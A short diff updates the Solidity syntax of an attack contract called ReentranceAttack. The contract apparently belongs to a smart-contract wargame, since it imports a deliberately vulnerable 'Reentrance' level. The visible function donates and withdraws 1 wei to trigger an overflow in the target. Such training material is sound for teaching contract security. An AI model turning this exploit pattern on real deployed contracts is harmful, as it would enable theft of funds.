@@ -1,4 +1,4 @@
-pragma solidity ^0.6.0;
+pragma solidity >=0.6.4 <0.8.0;
 
 import '../levels/Reentrance.sol';
 
@@ -11,7 +11,7 @@ contract ReentranceAttack {
   }
 
   function attack_1_causeOverflow() public {
-    target.donate.value(1)(address(this));
+    target.donate{ value: 1}(address(this));
     target.withdraw(1);
   }
 
